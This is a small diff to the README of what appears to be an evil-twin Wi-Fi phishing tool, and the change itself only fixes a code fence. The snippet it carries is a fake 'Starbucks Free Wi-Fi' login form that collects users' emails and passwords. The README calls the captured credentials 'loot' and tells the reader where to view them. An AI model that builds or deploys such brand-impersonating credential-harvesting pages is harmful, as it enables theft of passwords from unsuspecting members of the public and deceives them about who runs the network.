@@ -123,14 +123,14 @@ loot/login.html
 
 Wanna make it look like Starbucks? Just change the login.html body like this
 
-````html
+```html
 <h2>Welcome to Starbucks Free Wi-Fi</h2>
 <p>Please sign in to continue</p>
 <form method="POST" action="/login">
   <input type="text" name="username" placeholder="Email"><br>
   <input type="password" name="password" placeholder="Wi-Fi Password"><br>
   <input type="submit" value="Connect">
-</form>
+</form>```
 
 You can view your collected credentials in:
 
